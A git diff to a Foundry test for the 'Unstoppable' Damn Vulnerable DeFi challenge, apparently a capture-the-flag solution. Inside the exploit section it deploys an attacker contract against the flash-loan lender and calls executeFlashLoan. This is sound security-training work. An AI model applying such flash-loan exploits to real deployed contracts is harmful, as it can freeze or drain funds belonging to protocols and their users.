@@ -9,6 +9,7 @@ import {Vm} from "forge-std/Vm.sol";
 import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../Contracts/unstoppable/ReceiverUnstoppable.sol";
+import {AttackerUnstoppable} from "../../../Contracts/unstoppable/AttackerUnstoppable.sol";
 
 contract Unstoppable is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
@@ -19,6 +20,7 @@ contract Unstoppable is DSTest {
     Utilities internal utils;
     UnstoppableLender internal unstoppableLender;
     ReceiverUnstoppable internal receiverUnstoppable;
+    AttackerUnstoppable internal attackerUnstoppable;
     DamnValuableToken internal dvt;
     address payable internal attacker;
     address payable internal someUser;
@@ -60,6 +62,14 @@ contract Unstoppable is DSTest {
 
     function testFailExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+        attackerUnstoppable = new AttackerUnstoppable(
+            address(unstoppableLender)
+        );
+        vm.label(address(attackerUnstoppable), "Attacker Unstoppable");
+        attackerUnstoppable.executeFlashLoan(10);
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         testFailAfter();
